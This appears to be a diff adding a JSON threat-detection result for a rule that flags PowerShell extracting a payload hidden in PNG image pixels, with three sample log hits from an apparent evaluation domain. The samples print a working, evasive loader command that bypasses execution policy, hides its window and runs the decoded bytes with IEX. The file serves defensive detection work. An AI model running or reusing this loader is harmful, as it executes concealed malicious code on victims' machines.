@@ -1,0 +1,35 @@
+{
+  "rule_id": "d14d6b0c-8349-44c8-a5f8-2fc89299cb9e",
+  "title": "PowerShell Steganographic Payload Extraction via System.Drawing.Bitmap",
+  "severity": "high",
+  "tags": [
+    "attack.defense_evasion",
+    "attack.execution",
+    "attack.t1027.003",
+    "attack.t1059.001"
+  ],
+  "total_matches_recorded": 3,
+  "sample_evidence": [
+    {
+      "line": 6486,
+      "timestamp": "",
+      "Image": "",
+      "CommandLine": "\"PowerShell.exe\" -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"",
+      "User": null
+    },
+    {
+      "line": 6888,
+      "timestamp": "",
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "ScriptBlock": "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.Ge",
+      "User": null
+    },
+    {
+      "line": 6929,
+      "timestamp": "2020-05-02 02:58:44.325",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "\"PowerShell.exe\" -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"",
+      "User": "DMEVALS\\pbeesly"
+    }
+  ]
+}
